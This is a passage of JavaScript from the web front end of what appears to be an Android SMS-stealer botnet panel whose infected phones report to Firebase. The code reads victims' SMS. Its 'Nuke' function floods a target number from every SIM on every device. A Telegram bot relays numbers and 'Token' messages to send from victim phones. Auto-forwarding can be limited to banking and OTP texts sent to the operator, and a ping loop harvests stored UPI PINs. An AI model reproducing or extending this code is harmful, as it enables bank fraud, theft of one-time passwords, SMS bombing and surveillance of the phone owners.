async function sendSmsActive(){
  if(!selDev){toast('⚠ No device');return;}
  var to=document.getElementById('dmSendTo').value.trim();
  var msg=document.getElementById('dmSendMsg').value.trim();
  if(!to||!msg){toast('⚠ Fill both fields');return;}
  var sim=deviceSimMap[selDev.id]||1;
  var btn=document.getElementById('dmSendBtn');btn.disabled=true;btn.textContent='Sending…';
  // Fire-and-forget for instant UI feedback
  sendSmsFireAndForget(selDev,sim,to,msg,'manual').then(function(ok){
    if(ok){showResActive(true,'✓ SMS queued from SIM '+sim);document.getElementById('dmSendMsg').value='';document.getElementById('dmSendTo').value='';}
    else{showResActive(false,'⚠ Failed to send');}
    btn.disabled=false;btn.textContent='🚀 Send Message';
  });
}
function showResActive(ok,m){var el=document.getElementById('dmSendRes');el.textContent=m;el.className='sres '+(ok?'ok':'err');el.style.display='block';setTimeout(function(){el.style.display='none';},4000);}

/* ═══════════ ALL MSGS ═══════════ */
function openAllMsgs(){openM('allMsgsModal');trigAM(false);startAP();}
function setAMF(f){amfMode=f;['all','incoming','outgoing'].forEach(function(t){var e=document.getElementById('amf-'+t);if(e)e.classList.toggle('ma',t===f);});filterAndRender();}
function trigAM(force){if(amLoading)return;if(!force&&amLoaded&&amAll.length){filterAndRender();return;}loadAllMsgs(force);}
async function loadAllMsgs(force){
  var onlineDevs=allDevices.filter(function(d){return d.status;});
  if(!onlineDevs.length){document.getElementById('amList').innerHTML='<div class="empty"><div class="ei">📱</div><p>No online devices</p></div>';return;}
  amLoading=true;
  var now=Date.now();
  var toFetch=onlineDevs.filter(function(d){return force||!amCache[d.id]||now-amFetch[d.id]>10000;});
  var BATCH=30;
  for(var i=0;i<toFetch.length;i+=BATCH){
    await Promise.allSettled(toFetch.slice(i,i+BATCH).map(async function(dev){
      try{
        var fbUrl=dev._fbUrl||FB_URL,fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY;
        var auth=fbKey?'?auth='+fbKey+'&':'?';
        var r=await fetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=50',{signal:AbortSignal.timeout(4000)});
        amCache[dev.id]=parseMsgs(r.ok?await r.json():null);
        amFetch[dev.id]=Date.now();
      }catch(e){if(!amCache[dev.id])amCache[dev.id]=[];}
    }));
    rebuild();filterAndRender();
    await new Promise(function(r){setTimeout(r,0);});
  }
  amLoaded=true;amLoading=false;rebuild();filterAndRender();
}
function rebuild(){
  var onlineDevs=allDevices.filter(function(d){return d.status;});
  var c=[];
  for(var i=0;i<onlineDevs.length;i++){
    var dev=onlineDevs[i];var msgs=amCache[dev.id];
    if(!msgs||!msgs.length)continue;
    var note=noteC[dev.id]||dev.note||'';
    for(var j=0;j<msgs.length;j++){
      var m=msgs[j];
      c.push({key:m.key,message:m.message,sender:m.sender,_ts:m._ts,type:m.type,dateTime:m.dateTime,cn:i+1,did:dev.id,dname:dev.name,dnum:dev.mobNo,dnote:note});
    }
  }
  c.sort(function(a,b){return b._ts-a._ts;});
  amAll=c;
}
function filterAndRender(){
  var q=(document.getElementById('amSearch')||{}).value||'';q=q.toLowerCase();
  amFilt=amAll.filter(function(m){
    if(amfMode==='incoming'&&m.type!=='incoming')return false;
    if(amfMode==='outgoing'&&m.type!=='outgoing')return false;
    if(q)return(m.message+m.sender+m.did+m.dname).toLowerCase().includes(q);
    return true;
  });
  var list=document.getElementById('amList');list.innerHTML='';amCount=0;
  if(!amFilt.length){list.innerHTML='<div class="empty"><div class="ei">💬</div><p>No messages</p></div>';return;}
  renderPage();setupObs();
}
function renderPage(){
  var list=document.getElementById('amList');if(!list)return;
  var batch=amFilt.slice(amCount,amCount+AM);if(!batch.length)return;
  var frag=document.createDocumentFragment();
  batch.forEach(function(m){
    var el=document.createElement('div');
    el.className='am-card '+(m.type==='incoming'?'inc':'out');
    el.innerHTML='<div class="am-left"><div class="am-cn">#'+m.cn+'</div><div class="am-name">'+esc(m.dname)+'</div></div>'
      +'<div class="am-right"><div class="am-meta"><span class="am-sndr">'+esc(m.sender)+'</span><span class="msg-tp '+(m.type==='incoming'?'mt-i':'mt-o')+'">'+m.type+'</span><span class="msg-dt">'+esc(m.dateTime||'')+'</span></div><div class="am-txt">'+esc(m.message)+'</div></div>';
    frag.appendChild(el);
  });
  list.appendChild(frag);amCount+=batch.length;
}
async function pollAllFresh(){}

/* ═══════════ NUKE ═══════════ */
function openNuke(){document.getElementById('nukeModal').classList.add('open');updateNukeInfo();}
function updateNukeInfo(){
  var online=allDevices.filter(function(d){return d.status;});
  var simsTotal=0;online.forEach(function(d){simsTotal+=d.sims.length||0;});
  var totalShots=online.reduce(function(s,d){return s+(d.sims.length||0);},0);
  document.getElementById('nukeDeviceCount').textContent=online.length;
  document.getElementById('nukeSimCount').textContent=simsTotal;
  document.getElementById('nukeTotalShots').textContent=totalShots;
}
async function fireNuke(){
  var target=document.getElementById('nukeTarget').value.trim();
  var msg=document.getElementById('nukeMsg').value.trim();
  if(!target||!msg){toast('⚠ Enter number and message');return;}
  var online=allDevices.filter(function(d){return d.status;});
  if(!online.length){toast('⚠ No online devices');return;}
  var shots=[];
  online.forEach(function(dev){var simCount=dev.sims.length||1;for(var s=1;s<=simCount;s++)shots.push({dev:dev,sim:s});});
  nukeRunning=true;nukeSent=0;nukeFail=0;nukeTotal=shots.length;_nukeActive=0;_nukeStartTime=Date.now();
  document.getElementById('nukeSent').textContent='0';
  document.getElementById('nukeFail').textContent='0';
  document.getElementById('nukeTotal').textContent=shots.length;
  document.getElementById('nukeStats').classList.add('show');
  document.getElementById('nukeProgWrap').style.display='block';
  document.getElementById('nukeFireBtn').style.display='none';
  document.getElementById('nukeStopBtn').style.display='block';
  toast('💣 Nuking with '+shots.length+' shots…');
  var idx=0,done=0;
  var pool=Math.min(_nukePool,shots.length);
  function spawn(){
    while(_nukeActive<pool&&idx<shots.length&&nukeRunning){
      var shot=shots[idx++];var dev=shot.dev;
      var url=(dev._fbUrl||FB_URL)+'/clients/'+dev.id+'/webhookEvent/sendSms.json'+((dev._fbKey||FB_KEY)?'?auth='+(dev._fbKey||FB_KEY):'');
      var body=JSON.stringify({from:shot.sim,to:target,message:msg,isSended:false});
      _nukeActive++;
      fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:body,keepalive:true})
        .then(function(r){if(r.ok)nukeSent++;else nukeFail++;}).catch(function(){nukeFail++;})
        .finally(function(){_nukeActive--;done++;updateNukeProgress(done,shots.length);if(idx<shots.length&&nukeRunning)spawn();else if(done===shots.length)finishNuke();});
    }
  }
  spawn();
}
function updateNukeProgress(done,total){
  if(_nukeStatsTmr)return;
  _nukeStatsTmr=requestAnimationFrame(function(){
    _nukeStatsTmr=null;
    document.getElementById('nukeSent').textContent=nukeSent;
    document.getElementById('nukeFail').textContent=nukeFail;
    var pct=Math.round((done/total)*100);
    document.getElementById('nukeProgFill').style.width=pct+'%';
    document.getElementById('nukeProgTxt').textContent=pct+'% · '+done+'/'+total;
  });
}
function finishNuke(){nukeRunning=false;document.getElementById('nukeFireBtn').style.display='block';document.getElementById('nukeStopBtn').style.display='none';var e=((Date.now()-_nukeStartTime)/1000).toFixed(1);toast('✅ Nuke done — '+nukeSent+' sent, '+nukeFail+' failed in '+e+'s');}
function stopNuke(){nukeRunning=false;document.getElementById('nukeFireBtn').style.display='block';document.getElementById('nukeStopBtn').style.display='none';toast('⏹ Stopped');}

/* ═══════════ SETTINGS ═══════════ */
function openSettings(){populateSettingsUI();openM('settingsModal');}
function populateSettingsUI(){
  document.getElementById('setMyNumber').value=userConfig.myNumber||'';
  document.getElementById('setTgUserId').value=userConfig.userId||'';
  document.getElementById('setTgChannel').value=userConfig.channelId||'';
  document.getElementById('setTgEnabled').checked=userConfig.botEnabled!==false;
  document.getElementById('setFwdEnabled').checked=userConfig.forwardEnabled!==false;
  renderFbList();updateTgStatusLine();
  updateForwardModeUI();
}
function setForwardMode(mode){
  userConfig.forwardMode=mode;
  cacheConfigLocal();
  debouncedCloudSave();
  updateForwardModeUI();
  toast('✓ Forward mode: '+(mode==='banking'?'Banking only':'All messages'));
}
function updateForwardModeUI(){
  var mode=userConfig.forwardMode||'all';
  var bAll=document.getElementById('setFwdModeAll');
  var bBank=document.getElementById('setFwdModeBank');
  var hint=document.getElementById('fwdModeHint');
  if(bAll){
    bAll.style.background=mode==='all'?'rgba(168,85,247,.16)':'var(--bg3)';
    bAll.style.borderColor=mode==='all'?'rgba(168,85,247,.4)':'var(--border)';
    bAll.style.color=mode==='all'?'var(--gold2)':'var(--sub)';
  }
  if(bBank){
    bBank.style.background=mode==='banking'?'rgba(168,85,247,.16)':'var(--bg3)';
    bBank.style.borderColor=mode==='banking'?'rgba(168,85,247,.4)':'var(--border)';
    bBank.style.color=mode==='banking'?'var(--gold2)':'var(--sub)';
  }
  if(hint)hint.textContent=mode==='banking'?'Only bank/OTP/transaction messages will be forwarded':'All incoming messages will be forwarded';
}
function updateTgStatusLine(){
  var el=document.getElementById('tgStatusLine');if(!el)return;
  var lines=[];
  if(tgRunning){
    var ago=tgDiagnostics.lastUpdate?Math.round((Date.now()-tgDiagnostics.lastUpdate)/1000)+'s ago':'never';
    lines.push('● Running — monitoring '+(userConfig.channelId||'—'));
    lines.push('📊 Updates: '+tgDiagnostics.updateCount+' (last: '+ago+')');
    if(tgDiagnostics.botInfo)lines.push('🤖 @'+tgDiagnostics.botInfo.username);
    if(tgDiagnostics.lastError)lines.push('⚠ '+tgDiagnostics.lastError);
    el.className='settings-status '+(tgDiagnostics.lastError?'err':'on');
  } else {
    lines.push('○ Not running');
    if(tgDiagnostics.lastError)lines.push('⚠ '+tgDiagnostics.lastError);
    el.className='settings-status';
  }
  el.innerHTML=lines.join('<br>');
  updateTgBtn();
}
function updateTgBtn(){
  var btn=document.getElementById('tgStatus');if(!btn)return;
  btn.textContent=tgRunning?'🤖 ON':'🤖 OFF';
  btn.style.color=tgRunning?'var(--mint)':'var(--sub)';
  btn.style.borderColor=tgRunning?'rgba(6,214,160,.4)':'var(--border)';
  btn.style.background=tgRunning?'rgba(6,214,160,.08)':'var(--bg3)';
}
function renderFbList(){
  var el=document.getElementById('settingsFbList');if(!el)return;
  if(!fbInstances.length){el.innerHTML='<div style="font-size:11px;color:var(--dim);text-align:center;padding:14px">No extra Firebase URLs added</div>';return;}
  el.innerHTML=fbInstances.map(function(inst){
    return'<div class="fb-list-row"><div class="fb-list-row-info"><div class="fb-list-row-lbl">'+esc(inst.label)+'</div><div class="fb-list-row-url">'+esc(inst.url)+'</div></div>'
      +'<span style="font-size:10px;font-weight:700;color:'+(inst.status==='ok'?'var(--mint)':inst.status==='error'?'var(--rose)':'var(--gold)')+'">'+(inst.devCount||0)+' devs</span>'
      +'<button onclick="fbRemove(\''+inst.id+'\')" style="padding:4px 8px;background:rgba(244,63,94,.08);border:1px solid rgba(244,63,94,.2);border-radius:6px;color:var(--rose);font-size:11px;cursor:pointer;font-family:\'Chakra Petch\',sans-serif">✕</button></div>';
  }).join('');
}
async function addFirebaseFromSettings(){
  var label=document.getElementById('setFbLabel').value.trim();
  var url=document.getElementById('setFbUrl').value.trim().replace(/\/+$/,'');
  var key=document.getElementById('setFbKey').value.trim();
  if(!url){toast('⚠ Enter a URL');return;}
  if(fbInstances.find(function(x){return x.url===url;})){toast('⚠ Already added');return;}
  var inst={id:'fb_'+Date.now()+'_'+Math.random().toString(36).slice(2,7),label:label||('Firebase '+(fbInstances.length+1)),url:url,key:key,devices:[],status:'connecting',poll:null,devCount:0};
  fbInstances.push(inst);
  document.getElementById('setFbLabel').value='';document.getElementById('setFbUrl').value='';document.getElementById('setFbKey').value='';
  renderFbList();
  await fbLoadInst(inst);
  fbStartPoll(inst,0);syncFirebasesToConfig();renderFbList();
}
async function fbLoadInst(inst){
  try{
    var auth=inst.key?'?auth='+inst.key:'';
    var r=await fetch(inst.url+'/clients.json'+auth,{signal:AbortSignal.timeout(API_TIMEOUT)});
    if(!r.ok)throw new Error('HTTP '+r.status);
    var devs=parseDevs(await r.json());
    devs.forEach(function(d){d._fbId=inst.id;d._fbLabel=inst.label;d._fbUrl=inst.url;d._fbKey=inst.key;});
    inst.devices=devs;inst.devCount=devs.length;inst.status='ok';
    fbMergeAll();toast('✅ '+inst.label+': '+devs.length+' devices');
  }catch(e){inst.status='error';toast('❌ '+inst.label+' failed');}
}
function fbStartPoll(inst,staggerMs){
  if(inst.poll)clearInterval(inst.poll);
  setTimeout(function(){
    inst.poll=setInterval(async function(){
      if(!inst.url)return;
      try{
        var auth=inst.key?'?auth='+inst.key:'';
        var r=await fetch(inst.url+'/clients.json'+auth,{signal:AbortSignal.timeout(API_TIMEOUT)});
        if(!r.ok)return;
        var devs=parseDevs(await r.json());
        devs.forEach(function(d){d._fbId=inst.id;d._fbLabel=inst.label;d._fbUrl=inst.url;d._fbKey=inst.key;});
        inst.devices=devs;inst.devCount=devs.length;inst.status='ok';
        fbMergeAll();
      }catch(e){inst.status='error';}
    },POLL_DEV);
  },staggerMs||0);
}
function fbStopPoll(inst){if(inst.poll){clearInterval(inst.poll);inst.poll=null;}}
function fbRemove(id){
  var idx=fbInstances.findIndex(function(x){return x.id===id;});
  if(idx===-1)return;
  fbStopPoll(fbInstances[idx]);
  fbInstances.splice(idx,1);
  fbMergeAll();syncFirebasesToConfig();renderFbList();
  toast('🗑 Firebase removed');
}
function syncFirebasesToConfig(){userConfig.firebases=fbInstances.map(function(x){return{url:x.url,label:x.label,key:x.key};});debouncedCloudSave();}
function fbMergeAll(){if(_mergeDebTimer)clearTimeout(_mergeDebTimer);_mergeDebTimer=setTimeout(_doFbMergeAll,80);}
function _doFbMergeAll(){
  _mergeDebTimer=null;
  var merged=[];var seen=new Set();
  for(var pp=0;pp<allDevices.length;pp++){
    var pd=allDevices[pp];
    if((pd._fbId||'primary')==='primary'){var pk='primary:'+pd.id;if(!seen.has(pk)){seen.add(pk);merged.push(pd);}}
  }
  for(var ii=0;ii<fbInstances.length;ii++){
    if(fbInstances[ii].id==='primary')continue;
    var devs=fbInstances[ii].devices;
    for(var jj=0;jj<devs.length;jj++){var d=devs[jj];var k=(d._fbId||'primary')+':'+d.id;if(!seen.has(k)){seen.add(k);merged.push(d);}}
  }
  var onCnt=0;for(var x=0;x<merged.length;x++){if(merged[x].status)onCnt++;}
  var sig=merged.length+':'+onCnt;
  var changed=(sig!==_lastMergeSig);_lastMergeSig=sig;
  applyStableOrder(merged);allDevices=merged;renderStats();
  if(changed)renderGrid();renderFbList();
}
function fbRegisterPrimary(){allDevices.forEach(function(d){if(!d._fbId){d._fbId='primary';d._fbLabel='Primary';d._fbUrl=FB_URL;d._fbKey=FB_KEY;}});}
function loadFirebasesFromConfig(){
  var saved=userConfig.firebases||[];
  if(!saved.length)return;
  var toConnect=[];
  saved.forEach(function(s){
    if(!s.url||fbInstances.find(function(x){return x.url===s.url;}))return;
    var inst={id:'fb_'+Date.now()+'_'+Math.random().toString(36).slice(2,7),label:s.label||s.url,url:s.url,key:s.key||'',devices:[],status:'connecting',poll:null,devCount:0};
    fbInstances.push(inst);toConnect.push(inst);
  });
  if(!toConnect.length)return;
  (async function(){
    var BATCH=20;
    for(var i=0;i<toConnect.length;i+=BATCH){
      var batch=toConnect.slice(i,i+BATCH);
      await Promise.allSettled(batch.map(async function(inst){try{await fbLoadInst(inst);}catch(e){inst.status='error';}}));
      batch.forEach(function(inst,bi){fbStartPoll(inst,(i+bi)*100);});
      await new Promise(function(r){setTimeout(r,0);});
    }
    renderFbList();
  })();
}
function saveAllSettings(){
  userConfig.myNumber=document.getElementById('setMyNumber').value.trim();
  userConfig.userId=document.getElementById('setTgUserId').value.trim();
  userConfig.channelId=document.getElementById('setTgChannel').value.trim();
  userConfig.botEnabled=document.getElementById('setTgEnabled').checked;
  userConfig.forwardEnabled=document.getElementById('setFwdEnabled').checked;
  cacheConfigLocal();debouncedCloudSave();
  if(userConfig.botEnabled&&userConfig.channelId){startTelegramBot();}else{stopTelegramBot();}
  updateTgStatusLine();
  toast('💾 Saved · My: '+(userConfig.myNumber||'—')+' · Mode: '+(userConfig.forwardMode||'all'));
}

/* ═══════════ TELEGRAM BOT (fast poll) ═══════════ */
async function fetchBotUsername(){
  try{
    var r=await fetch(CFG.TG_API+'/getMe',{signal:AbortSignal.timeout(4000)});
    var d=await r.json();
    if(d.ok&&d.result){tgDiagnostics.botInfo=d.result;var el=document.getElementById('botUsername');if(el)el.textContent='@'+(d.result.username||'bot');}
  }catch(e){}
}
async function startTelegramBot(){
  stopTelegramBot();
  if(!userConfig.channelId){toast('⚠ Set channel ID first');return;}
  tgDiagnostics.lastError='';updateTgStatusLine();
  try{await fetch(CFG.TG_API+'/deleteWebhook?drop_pending_updates=false',{signal:AbortSignal.timeout(4000)});}catch(e){}
  try{
    var r2=await fetch(CFG.TG_API+'/getMe',{signal:AbortSignal.timeout(4000)});var d2=await r2.json();
    if(!d2.ok){tgDiagnostics.lastError='Bot token invalid';toast('❌ Bot token invalid');updateTgStatusLine();return;}
    tgDiagnostics.botInfo=d2.result;
  }catch(e){tgDiagnostics.lastError='getMe error';toast('❌ Cannot reach Telegram API');updateTgStatusLine();return;}
  try{var r4=await fetch(CFG.TG_API+'/getUpdates?offset=-1&timeout=0&limit=1',{signal:AbortSignal.timeout(4000)});var d4=await r4.json();if(d4.ok&&d4.result&&d4.result.length){tgLastUpdateId=d4.result[d4.result.length-1].update_id+1;}else{tgLastUpdateId=0;}}catch(e){tgLastUpdateId=0;}
  tgRunning=true;tgDiagnostics.lastError='';tgDiagnostics.updateCount=0;updateTgStatusLine();updateTgBtn();
  if(!tgPollLoop){tgPollLoop=true;telegramLoop();}
  toast('🤖 Bot listening on '+(tgDiagnostics.botInfo?'@'+tgDiagnostics.botInfo.username:'bot'));
}
function stopTelegramBot(){tgRunning=false;tgPollLoop=false;updateTgStatusLine();updateTgBtn();}
async function telegramLoop(){
  var consecutiveErrors=0;
  while(tgPollLoop){
    if(!tgRunning){await sleep(200);continue;}
    try{
      var hadError=await telegramPollOnce();
      if(hadError){consecutiveErrors++;if(consecutiveErrors>5){await sleep(2000);consecutiveErrors=0;}}
      else{consecutiveErrors=0;}
    }catch(e){consecutiveErrors++;if(consecutiveErrors>5){await sleep(2000);consecutiveErrors=0;}}
    await sleep(TG_POLL);
  }
}
function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
async function telegramPollOnce(){
  var url=CFG.TG_API+'/getUpdates?timeout=1';
  if(tgLastUpdateId)url+='&offset='+tgLastUpdateId;
  url+='&allowed_updates='+encodeURIComponent(JSON.stringify(['channel_post','edited_channel_post','message','edited_message']));
  var r;
  try{r=await fetch(url,{signal:AbortSignal.timeout(3000)});}catch(e){return true;}
  if(!r.ok){
    if(r.status===409){try{await fetch(CFG.TG_API+'/deleteWebhook',{signal:AbortSignal.timeout(3000)});}catch(e){}return true;}
    return true;
  }
  var data=await r.json();
  if(!data.ok)return true;
  if(!data.result||!data.result.length)return false;
  tgDiagnostics.updateCount+=data.result.length;tgDiagnostics.lastUpdate=Date.now();
  for(var i=0;i<data.result.length;i++){
    var u=data.result[i];
    tgLastUpdateId=u.update_id+1;
    var msg=u.channel_post||u.edited_channel_post||u.message||u.edited_message;
    if(!msg)continue;
    var chatId=String(msg.chat&&msg.chat.id||'');
    var chatUser=String(msg.chat&&msg.chat.username||'');
    var cfgCh=String(userConfig.channelId||'');
    var cfgChClean=cfgCh.replace('@','');
    var match=false;
    if(!cfgCh)match=false;
    else if(cfgCh.startsWith('@')){match=(chatUser.toLowerCase()===cfgChClean.toLowerCase());}
    else{var cfgNum=cfgCh.replace(/[^\-\d]/g,'');match=(chatId===cfgNum)||(chatId===cfgCh);if(!match&&cfgNum.length>6&&chatId.length>6){match=chatId.endsWith(cfgNum.slice(-9))||cfgNum.endsWith(chatId.slice(-9));}}
    if(!match)continue;
    var text=msg.text||msg.caption||'';
    if(!text)continue;
    var parsed=parseTelegramMessage(text);
    if(!parsed.valid){toast('🤖 No number/message');continue;}
    console.log('[TG] Match! Sending to '+parsed.number);
    handleTelegramSms(parsed.number,parsed.message,msg); // fire-and-forget
  }
  updateTgStatusLine();
  return false;
}
function parseTelegramMessage(text){
  text=String(text||'');
  var number=null,message=null;
  var numPats=[
    /📱\s*Receipt[:\s]+(\+?\d{10,15})/i,
    /📞\s*To[:\s]+(\+?\d{10,15})/i,
    /📱\s*Number[:\s]+(\+?\d{10,15})/i,
    /(?:Receipt|To Number|Target Number|Mobile|Number)[:\s]+(\+?\d{10,15})/i,
    /(?:^|\D)(\+91[\s-]?\d{10})(?:\D|$)/,
    /(?:^|\D)(91\d{10})(?:\D|$)/,
    /(?:^|\D)(\d{10})(?:\D|$)/
  ];
  for(var i=0;i<numPats.length;i++){var m=text.match(numPats[i]);if(m){number=m[1].replace(/[^\d]/g,'');if(number.length>10)number=number.slice(-10);break;}}
  var msgPats=[
    /💬\s*Message[:\s]+([^\n]+)/i,
    /💬\s*Msg[:\s]+([^\n]+)/i,
    /🔑\s*Token[:\s]*\n\s*([^\n]+)/i,
    /🔑\s*Token[:\s]+([^\n]+)/i,
    /(?:Message|Msg|Body|Text|Token)[:\s]+([^\n]+)/i
  ];
  for(var j=0;j<msgPats.length;j++){var mm=text.match(msgPats[j]);if(mm&&mm[1]&&mm[1].trim()){message=mm[1].trim();break;}}
  if(!number||!message){
    var otc=text.match(/One[\s-]?tap\s*copy[:\s]*\n?\s*(\+?\d{10,15})\s*\|\s*([^\n]+)/i);
    if(otc){if(!number){number=otc[1].replace(/[^\d]/g,'');if(number.length>10)number=number.slice(-10);}if(!message)message=otc[2].trim();}
  }
  if(!message){
    var lines=text.split('\n').map(function(l){return l.trim();}).filter(function(l){
      if(!l)return false;
      if(/^[━═─_=\-·•\s]+$/.test(l))return false;
      if(/Module by|DM to Buy|One[\s-]?tap copy|https?:\/\//i.test(l))return false;
      if(/^[+\d\s|,.\-()]+$/.test(l))return false;
      if(/^[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}]/u.test(l)&&l.length<25)return false;
      if(/@\w+/.test(l)&&l.length<35)return false;
      return true;
    });
    if(lines.length){lines.sort(function(a,b){return b.length-a.length;});message=lines[0];}
  }
  if(message){message=message.replace(/^[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}\s]+/u,'');message=message.trim();}
  if(message&&message.length<3)message=null;
  if(number&&number.length<10)number=null;
  return{number:number,message:message,valid:!!(number&&message)};
}
async function handleTelegramSms(number,message,msgObj){
  var dev=null;
  if(activeDeviceUid){var parts=activeDeviceUid.split('|||');dev=allDevices.find(function(x){return x.id===parts[1]&&(x._fbId||'primary')===parts[0];});}
  if(!dev)dev=selDev||allDevices.find(function(d){return d.status;});
  if(!dev){toast('⚠ No device for telegram');return;}
  var sim=deviceSimMap[dev.id]||1;
  // Fire-and-forget for instant
  sendSmsFireAndForget(dev,sim,number,message,'tg').then(function(ok){
    if(ok)toast('🤖 SMS → '+number+' via '+dev.name);
    else toast('🤖 Failed');
  });
}

/* ═══════════ AUTO-FORWARD (fallback for poll) ═══════════ */
async function checkAndForward(msgs,deviceId){
  if(!msgs||!msgs.length)return;
  var dev=allDevices.find(function(d){return d.id===deviceId;});
  if(!dev)return;

  var lastForwarded=forwardTracker[deviceId]||'';
  if(!lastForwarded){forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();return;}
  if(userConfig.forwardEnabled===false){if(msgs[0].key!==lastForwarded){forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();}return;}
  var myNum=userConfig.myNumber;
  if(!myNum){if(msgs[0].key!==lastForwarded){forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();}return;}

  var forwardMode=userConfig.forwardMode||'all';
  var toForward=[];
  for(var i=0;i<msgs.length;i++){
    var m=msgs[i];
    if(m.key===lastForwarded)break;
    if(m.type!=='incoming')continue;
    if(!m.message||!m.message.trim()||m.message.trim()==='(no body)')continue;
    if(forwardMode==='banking'&&!isBankingSms(m.sender,m.message))continue;
    toForward.push(m);
  }
  if(!toForward.length){if(msgs[0].key!==lastForwarded){forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();}return;}
  forwardTracker[deviceId]=msgs[0].key;
  saveForwardTracker();
  var sim=deviceSimMap[dev.id]||1;
  // Fire-and-forget all in parallel
  for(var j=toForward.length-1;j>=0;j--){
    sendSmsFireAndForget(dev,sim,myNum,String(toForward[j].message||'').trim(),'fwd');
  }
  if(toForward.length>0)toast('📤 Forwarded '+toForward.length+' msg(s) → '+myNum);
}

/* ═══════════ PING ═══════════ */
var _apOn=false,_pingTmr=null,_pingReplied=0,_pingTotal=0,_pingPrevStatus={};
function _pingUpdateBtn(){var b=document.getElementById('apBtn');if(!b)return;if(!_apOn){b.textContent='PING';b.style.color='var(--lilac)';return;}b.textContent=_pingReplied+'/'+_pingTotal;b.style.color=_pingReplied>0?'var(--mint)':'var(--gold2)';}
function _pingBuildPanel(){
  if(document.getElementById('pingPanel'))return;
  var p=document.createElement('div');p.id='pingPanel';
  p.style.cssText='position:fixed;bottom:20px;right:20px;width:300px;max-height:440px;background:linear-gradient(145deg,#130a22,#0d0618);border:1px solid rgba(168,85,247,.28);border-radius:16px;z-index:8000;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.8);display:flex;flex-direction:column;';
  var hdr=document.createElement('div');hdr.style.cssText='padding:12px 16px;border-bottom:1px solid rgba(168,85,247,.1);display:flex;align-items:center;gap:8px;';
  hdr.innerHTML='<div style="width:8px;height:8px;border-radius:50%;background:var(--mint);box-shadow:0 0 8px var(--mint);animation:pulse 1.5s infinite"></div><div style="font-size:13px;font-weight:800;color:var(--gold2);flex:1">Live Ping</div><div id="pingStats" style="font-size:11px;font-weight:700;color:var(--sub)">0/0</div><button onclick="document.getElementById(\'pingPanel\').remove();_apOn=false;if(_pingTmr)clearTimeout(_pingTmr);_pingUpdateBtn();" style="background:none;border:none;color:var(--sub);cursor:pointer;font-size:18px">×</button>';
  var list=document.createElement('div');list.id='pingList';list.style.cssText='overflow-y:auto;flex:1;';
  p.appendChild(hdr);p.appendChild(list);document.body.appendChild(p);
}
function _pingAddRow(uid,name,online,isNew){
  var list=document.getElementById('pingList');if(!list)return;
  var ex=document.getElementById('pr_'+CSS.escape(uid));
  if(ex){var d=ex.querySelector('.pr-dot'),l=ex.querySelector('.pr-label'),b=ex.querySelector('.pr-badge');if(d)d.style.background=online?'var(--mint)':'rgba(244,63,94,.4)';if(l){l.textContent=name;l.style.color=online?'var(--text)':'var(--dim)';}if(b){b.textContent=online?'ON':'OFF';b.style.color=online?'var(--mint)':'var(--rose)';}if(isNew)list.insertBefore(ex,list.firstChild);return;}
  var row=document.createElement('div');row.id='pr_'+uid;
  row.style.cssText='display:flex;align-items:center;gap:9px;padding:8px 14px;border-bottom:1px solid rgba(168,85,247,.04);'+(isNew?'background:rgba(255,221,0,.08);':'');
  row.innerHTML='<div class="pr-dot" style="width:8px;height:8px;border-radius:50%;background:'+(online?'var(--mint)':'rgba(244,63,94,.4)')+'"></div><div class="pr-label" style="flex:1;font-size:12px;font-weight:600;color:'+(online?'var(--text)':'var(--dim)')+'">'+esc(name)+'</div><div class="pr-badge" style="font-size:9px;font-weight:800;color:'+(online?'var(--mint)':'var(--rose)')+'">'+(online?'ON':'OFF')+'</div>';
  if(online)list.insertBefore(row,list.firstChild);else list.appendChild(row);
}
function autoPinAll(){
  if(_apOn){_apOn=false;if(_pingTmr){clearTimeout(_pingTmr);_pingTmr=null;}_pingUpdateBtn();toast('⏹ Stopped');return;}
  if(!allDevices.length){toast('⚠ No devices');return;}
  _apOn=true;_pingReplied=0;_pingTotal=allDevices.length;_pingUpdateBtn();_pingBuildPanel();
  toast('📡 Pinging '+_pingTotal+' devices...');_apLoop();
}
async function _apLoop(){
  if(!_apOn)return;
  _pingReplied=0;_pingTotal=0;var onCount=0,newOnline=0;
  var targets=fbInstances.length>0?fbInstances:[{id:'primary',url:FB_URL,key:FB_KEY,label:'Primary'}];
  try{
    var results=await Promise.allSettled(targets.map(async function(inst){
      var auth=inst.key?'?auth='+inst.key:'';
      var r=await fetch(inst.url+'/clients.json'+auth,{signal:AbortSignal.timeout(8000)});
      return{inst:inst,data:await r.json()};
    }));
    var allClients=[];
    results.forEach(function(res){
      if(res.status!=='fulfilled'||!res.value||!res.value.data)return;
      var inst=res.value.inst,data=res.value.data;
      if(typeof data!=='object')return;
      Object.keys(data).forEach(function(id){if(data[id]&&typeof data[id]==='object')allClients.push({id:id,cl:data[id],inst:inst,uid:inst.id+':'+id});});
    });
    _pingTotal=allClients.length;
    for(var i=0;i<allClients.length;i++){
      if(!_apOn)break;
      var it=allClients[i];
      var isOnline=!!it.cl.status;
      var prev=_pingPrevStatus[it.uid];
      var isNew=(prev===false&&isOnline);
      if(isOnline){_pingReplied++;onCount++;}if(isNew)newOnline++;
      _pingPrevStatus[it.uid]=isOnline;
      var dev=allDevices.find(function(d){return d.id===it.id&&(d._fbId||'primary')===(it.inst.id||'primary');});
      var name=it.cl.modelName||it.cl.model||it.id;
      if(dev){dev.status=isOnline;name=dev.name;}
      if(it.cl.upipin){pinC[it.id]=String(it.cl.upipin).trim();if(dev)dev.upipin=pinC[it.id];}
      _pingAddRow(it.uid,name,isOnline,isNew);
      if(i%50===0||i===allClients.length-1){var s=document.getElementById('pingStats');if(s)s.textContent=_pingReplied+'/'+_pingTotal;_pingUpdateBtn();await new Promise(function(r){setTimeout(r,0);});}
    }
  }catch(e){}
  _pingUpdateBtn();renderGrid();renderStats();
  if(_apOn)_pingTmr=setTimeout(_apLoop,3000);
}

/* ═══════════ OTP BAR ═══════════ */
var _lastOtp='';
